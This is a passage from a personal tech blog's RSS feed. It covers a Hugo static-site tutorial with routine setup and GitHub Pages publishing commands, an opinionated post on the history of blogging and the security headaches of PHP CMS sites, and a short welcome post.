git clone https://github.com/dplesca/purehugo.git themes/purehugo
echo &amp;quot;theme = purehugo&amp;quot; &amp;gt;&amp;gt; config.toml 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creating or customizing themes is beyond the scope of this post, but what we are doing here is &amp;ldquo;installing&amp;rdquo; a pre-baked Hugo theme, and then setting it as our default.&lt;/p&gt;

&lt;h2 id=&#34;hugo-workflow-drafting-publishing-a-post-macos&#34;&gt;Hugo Workflow: Drafting &amp;amp; Publishing a Post (MacOS)&lt;/h2&gt;

&lt;p&gt;In order to create a new post for your blog:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cd myBlog
hugo new post/myReviewOfHugo.md
open content/post/myReviewOfHugo.md # write the post in your text editor

# Optional: launch a local webserver, give it a sec, and preview the blog
hugo server &amp;amp; sleep 2 &amp;amp;&amp;amp; open http://localhost:1313/blog/
killall hugo # because we left hugo running in the background there
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While the server is running, you can actually continue to edit the post in your editor. The server will live update the view in your browser. This is optional, but it will verify that everything will look correct when you publish.&lt;/p&gt;

&lt;p&gt;When you&amp;rsquo;re satisfied, you can generate the actual web content to disk, and publish it. The following steps assume you are using Github Pages, so the publish is made using a &lt;code&gt;git&lt;/code&gt; push.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# You must already have a GitHub project, and in its settings page, and have set the GitHub pages to &amp;quot;master branch / docs&amp;quot;. In this example, the project name is &amp;quot;blog&amp;quot;.

# These are the one-time Hugo steps:
echo &amp;quot;publishDir = docs&amp;quot; &amp;gt;&amp;gt; config.toml
echo &amp;quot;baseURL = https://myname.github.com/blog&amp;quot; &amp;gt;&amp;gt; config.toml

# These are the one-time Git steps:
rm -rf themes/.git # delete existing git files so they don&#39;t interfere
git init  # turn this directory into a git repo
git remote add origin https://github.com/myname/blog.git

# These are the only steps needed every time you publish new content:
hugo  # this generates HTML + JS + CSS under the publishdir (blog/docs/)
git add -A
git commit -m &amp;quot;Add a blog post about whatever.&amp;quot;
git push
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s all there is to it, although you can always use a different Git client if you don&amp;rsquo;t like the command line. I sure as hell don&amp;rsquo;t like it (I use Atlassian Sourcetree) but it&amp;rsquo;s up to you.&lt;/p&gt;

&lt;h2 id=&#34;post-metadata-wtf-is-front-matter&#34;&gt;Post Metadata: WTF is &amp;ldquo;Front Matter&amp;rdquo; ?&lt;/h2&gt;

&lt;p&gt;In each post (each Markdown file), there is some metadata in a header at the top of the file, called &amp;ldquo;front matter.&amp;rdquo; Jekyll was the first to introduce this concept (in name, at least), but it is common across other static generators now. Hugo lets you write front matter in YAML, JSON or TOML (the default). If you&amp;rsquo;ve worked in web development surely you&amp;rsquo;ve heard of JSON, but now you may be asking WTF is YAML and TOML?&lt;/p&gt;

&lt;p&gt;These are syntaxes invented specifically for controlling the settings of static site generators. It seems to be a case of &amp;ldquo;reinventing the wheel&amp;rdquo; of &lt;a href=&#34;https://en.wikipedia.org/wiki/INI_file&#34;&gt;INI files&lt;/a&gt;, which have been around for decades. Basically, a config file. Key-value pairs. Associative array. Hash table (please don&amp;rsquo;t shorten it to just &amp;ldquo;hash,&amp;rdquo; words have meanings, know the difference). Dictionary. They&amp;rsquo;re all basically the same thing. YAML started in 2009 or so, as a minimalist-syntax alternative to JSON, which itself was a minimalist alternative to XML. &lt;a href=&#34;https://en.wikipedia.org/wiki/Comparison_of_data_serialization_formats&#34;&gt;We&amp;rsquo;ll get this right some day&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The CEO of GitHub and inventor of Jekyll, probably high on the smell of his own farts, in 2013 decided that YAML needed to be even more minimal, and renamed this idea after himself (&amp;ldquo;TOM&amp;rdquo;), and thus was born TOML, which primarily because of the fame of the creator has now spread &lt;a href=&#34;https://github.com/toml-lang/toml#projects-using-toml&#34;&gt;to a few other projects&lt;/a&gt;. Thus, we have minimalized almost all the way back to INI files (except now it has been &amp;ldquo;standardized&amp;rdquo;). Progress.&lt;/p&gt;

&lt;p&gt;Oh and by the way, none of these &lt;em&gt;are actually markup languages at all&lt;/em&gt;. They just aren&amp;rsquo;t. The insistence on propagating the use of the acronym letters -ML for config file formats is basically an inside joke at this point.&lt;/p&gt;

&lt;p&gt;The takeaway for me is that in the mid-2000s it became fashionable to ditch braces and brackets in all syntax for everything, in favor of careful indentation. Thus returning to the fashion of the 1970s and FORTRAN. You know what&amp;rsquo;s popular &lt;em&gt;today&lt;/em&gt;, though? Look at Go, Rust, and Swift. Yea that&amp;rsquo;s right, compiled languages with curly braces are back again. &lt;a href=&#34;https://www.youtube.com/watch?v=sX0CbA4718A&#34;&gt;Urge to kill risinnnnnnng.&lt;/a&gt; All right, deep breaths.&lt;/p&gt;

&lt;p&gt;Anyway, within this &amp;ldquo;front matter,&amp;rdquo; you can define tags and categories, timestamps, and titles for every post. For examplte, the front matter for this post was defined as such:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-toml&#34;&gt;+++
Tags = [&amp;quot;web&amp;quot;,&amp;quot;blogging&amp;quot;,&amp;quot;Hugo&amp;quot;, &amp;quot;Jekyll&amp;quot;, &amp;quot;YAML&amp;quot;, &amp;quot;TOML&amp;quot;]
Description = &amp;quot;Initial impressions on the static site generator, Hugo&amp;quot;
date = &amp;quot;2017-02-03T19:07:12-05:00&amp;quot;
title = &amp;quot;Hugo, the static site generator&amp;quot;
Categories = [&amp;quot;web&amp;quot;,&amp;quot;blogging&amp;quot;,&amp;quot;Hugo&amp;quot;]
+++
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can also set optional variables like a publish date in the future (Hugo will not render it to the content directory until this date), or an alias (if you want to forward visitors from another URL to this post instead).&lt;/p&gt;

&lt;p&gt;The configuration file for your Hugo site, &lt;code&gt;config.toml&lt;/code&gt;, is also in this syntax.&lt;/p&gt;

&lt;p&gt;That more or less covers the basics of Hugo, and static site generators like it. My next post will be about Markdown (an &lt;em&gt;actual&lt;/em&gt; markup language).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>How to Blog in 2017</title>
      <link>https://michael-myers.github.io/blog/post/static-site-generators/</link>
      <pubDate>Fri, 03 Feb 2017 15:43:53 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/static-site-generators/</guid>
      <description>&lt;p&gt;My first blog, back in the early 2000s, was on a hosted blogging platform known as &lt;a href=&#34;https://en.wikipedia.org/wiki/Blogger_(service)&#34;&gt;Blogger&lt;/a&gt;. It was simple and convenient: as the admin you just logged into the Blogger service, edited posts in your browser, and hit publish. This is basically how Tumblr still works today, although Tumblr&amp;rsquo;s innovation was to include media file hosting and allow everyone to repost each others&amp;rsquo; content.&lt;/p&gt;

&lt;p&gt;But Blogger content was &lt;em&gt;static&lt;/em&gt;, and textual. You could post a few paragraphs of text, and embed images if they were hosted elsewhere. Only later did Google buy out the service and integrate it with their photo-hosting service. In the mid-2000s, many geeks wanted more flexibility, like the ability to limit access to members only, integrate their own photo/video/audio collections, and – most importantly – control the appearance of their blog.&lt;/p&gt;

&lt;p&gt;So my second blog was generated with a Web Content Management System (CMS) and self-hosted on a home Windows XP PC running the &amp;ldquo;&lt;a href=&#34;https://en.wikipedia.org/wiki/LAMP_%28software_bundle%29#WAMP&#34;&gt;WAMP&lt;/a&gt;&amp;rdquo; software stack, with a DNS record from a free dynamic DNS service. If you&amp;rsquo;re a system admin or security expert you&amp;rsquo;re probably cringing. I am too. In hindsight, it&amp;rsquo;s a miracle if that PC was not 0wned by a hacker at some point, but at least I have no evidence to believe it was. But I thought my blog was pretty cool, it had a custom look, custom domain name, its own forums, file storage, a weather widget on the sidebar. I believe it was using the &lt;a href=&#34;https://en.wikipedia.org/wiki/Drupal&#34;&gt;Drupal CMS&lt;/a&gt;. The 2000s saw this rise of the &amp;ldquo;web app,&amp;rdquo; a concept that an application was something that ran in a scripting language on a web server and presented you with a web page as the user interface. As a system programmer who thinks an application is a single self-contained compiled binary, I thought this was an anathema. But the rest of the tech world decided otherwise: websites that were not database-backed and server-side-scripted were totally 90s! That meant lame. 90s wasn&amp;rsquo;t cool again yet.&lt;/p&gt;

&lt;p&gt;The reason why the self-hosted CMS approach to blogging is cringey is that it is notoriously difficult to secure a CMS, especially one written in PHP. PHP is now known to be prone to reoccuring security issues because of flaws in its design (unvalidated input, access control problems, command injection issues, etc.), and the use of a SQL database means fighting a war agains SQL injection attacks from anyone who uses your site. Spammers will leave spam comments. You just want to run a blog, but now you&amp;rsquo;re a system admin for a web server, a database admin for a database, and you have to understand the PHP (or Java, or whatever) that generates your site on the fly every time a visitor loads a page. If you ever want to use a web hosting service for your CMS-based site instead of hosting it at home, you have to pay real money, because supporting and securing Apache, PHP, and MySQL is a full-time job! On top of all of that, all of this script and database stuff makes the site is slower to load, and prone to Denial of Service attacks.&lt;/p&gt;

&lt;p&gt;This is no way to live. And so, as is typical, the tech community decided that what is old is new again, and that static sites were actually a good idea that should never have been abandoned. Rolling my eyes so hard I went temporarily blind, I actually resisted even caring about the cool way to blog in the 2010s. I used LiveJournal for a bit. I tried a hosted Wordpress (Wordpress.com) account to blog about game console emulators. I got into using Tumblr, even though (or maybe &lt;em&gt;because&lt;/em&gt;) the tech community is not on there. But now I&amp;rsquo;ve decided to give a fresh look at what&amp;rsquo;s fresh, and give it a chance.&lt;/p&gt;

&lt;p&gt;Here are some things I noticed about the current Preferred Way for Cool Kids to Blog.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If you write any kind of code for a living, you host it on a free hosting service in the .io TLD. This is just what is fashionable, and like all fashion choices, it can&amp;rsquo;t really be explained. &amp;ldquo;Everyone is doing it&amp;rdquo;, including this blog. We are not all hosting sites in the British Indian Ocean Territory, but yes, this TLD exists because the UK &lt;a href=&#34;https://en.wikipedia.org/wiki/Depopulation_of_Chagossians_from_the_Chagos_Archipelago&#34;&gt;stole some Pacific Islanders&amp;rsquo; land&lt;/a&gt; during the Cold War, and its only other claim to fame might be &lt;a href=&#34;http://content.time.com/time/world/article/0,8599,1828469,00.html&#34;&gt;its black site CIA torture prison&lt;/a&gt;. How&amp;rsquo;s that for oblivious Silicon Valley tech privilege!&lt;/li&gt;
&lt;li&gt;Because HTML, JS, and CSS are nearly impossible to work in directly anymore (much like assembly code), people write their web page content in a highly simplified markup language, and then run &lt;em&gt;that&lt;/em&gt; through a compiler (oh, sorry, &lt;em&gt;static site generator&lt;/em&gt;) to produce a web site in actual HTML, JS, and CSS. The output is then posted to a web hosting service. There are some &lt;a href=&#34;https://staticsitegenerators.net&#34;&gt;450 static site generators&lt;/a&gt; to choose from. This site uses Hugo, which I&amp;rsquo;ll talk about in a future post. An even more popular choice is Jekyll, which is fine…for me to poop on.&lt;/li&gt;
&lt;li&gt;The simplified markup language of choice currently is &lt;a href=&#34;https://en.wikipedia.org/wiki/Markdown&#34;&gt;Markdown&lt;/a&gt;, which will also be the subject of a future post because it is pretty neat.&lt;/li&gt;
&lt;li&gt;Because supporting the ability for visitors to post comments would require a dynamic site, static sites have outsourced this responsibility to third-party services. That is, comments are implemented with an embedded JavaScript element that is loaded from a remote service. The dominant choice of service at the moment is &lt;a href=&#34;https://en.wikipedia.org/wiki/Disqus&#34;&gt;Disqus&lt;/a&gt;. This and any other user-account-based service that embeds its content on your blog is a privacy problem: it means Disqus is basically assigning you an identifier and following you around to all of the Disqus-enabled sites you visit. &lt;a href=&#34;https://www.ghostery.com&#34;&gt;Ghostery&lt;/a&gt; blocks Disqus by default, for this reason. I suggest using Twitter to reach me if you have a comment.&lt;/li&gt;
&lt;li&gt;Because static sites cannot track how many visitors they get and where they visited from, that too has been outsourced. &lt;a href=&#34;https://en.wikipedia.org/wiki/Google_Analytics&#34;&gt;Google Analytics&lt;/a&gt; is now more prevalent than HPV and herpes combined. I have had to delete it out of every web-related code repository that I have borrowed to make anything. Even if I&amp;rsquo;m the last one on Earth who cares about privacy, I will not be including that here. The same goes for social media sharing links. You&amp;rsquo;re a big boy and/or girl, I bet you&amp;rsquo;ll figure out how to share a URL yourself!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So there you have it, my take on the Way to Blog in the 2010s for Cool Kids. Thanks for reading. – MM&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Welcome</title>
      <link>https://michael-myers.github.io/blog/post/welcome/</link>
      <pubDate>Thu, 02 Feb 2017 23:07:37 -0500</pubDate>
      
      <guid>https://michael-myers.github.io/blog/post/welcome/</guid>
      <description>&lt;p&gt;Welcome to my blog. Here I&amp;rsquo;ll be writing about a variety of tech and business-related topics as I try to explore, experiment, and learn some new skills.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve been working in computer security since mid-2000, but due to the nature of the work, I have unfortunately published little-to-nothing in the public sphere. As part of a plan to do more &amp;ldquo;giving back,&amp;rdquo; I&amp;rsquo;m starting this blog, and (hopefully) putting out some interesting open-source tools and articles.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s all for now, thanks for visiting.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>